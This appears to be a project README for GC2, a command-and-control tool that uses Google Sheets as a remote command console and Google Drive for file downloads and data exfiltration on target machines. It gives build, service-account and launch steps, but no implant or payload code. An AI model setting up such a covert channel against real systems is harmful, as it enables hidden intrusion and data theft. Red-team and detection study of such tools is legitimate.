# GC2

GC2 is a Command and Control application that allow an attacker to execute command on the target machine using Google Sheet.


# Set up

1. **Build executable**
 
    ```bash
    git clone <asdf>
    cd <asdf>
    go build gc2-sheet.go
    ```

2. **Create a new google "service account"**
 
    Create a new google "service account" using [https://console.cloud.google.com/](https://console.cloud.google.com/), create a .json key file for the service account 

3. **Enable Google Drive API**

    Enable Google Drive API [https://developers.google.com/drive/api/v3/enable-drive-api](https://developers.google.com/drive/api/v3/enable-drive-api) and Google Sheet API [https://developers.google.com/sheets/api/quickstart/go](https://developers.google.com/sheets/api/quickstart/go) 

3. **Set up Google Sheet and Google Drive**

    Create a new Google Sheet and add the service account to the editor of the spreadsheet
    
    Create a new Google Drive folder and add the service account to the editor of the folder

4. **Start the C2**

    ```bash
    gc2-sheet --key <GCP service account credential in JSON> --sheet <Google sheet ID> --drive <Google drive ID>
    ```

## Features

- Command execution using Google Sheet as a console
- Download files on the target using Google Drive
- Data exfiltration using Google Drive

### Command execution
### Data exfiltration file
### Download file

#### Support the project

**Pull request** or [![paypal](https://www.paypalobjects.com/en_US/i/btn/btn_donate_SM.gif)](https://www.paypal.com/donate?hosted_button_id=8EWYXPED4ZU5E)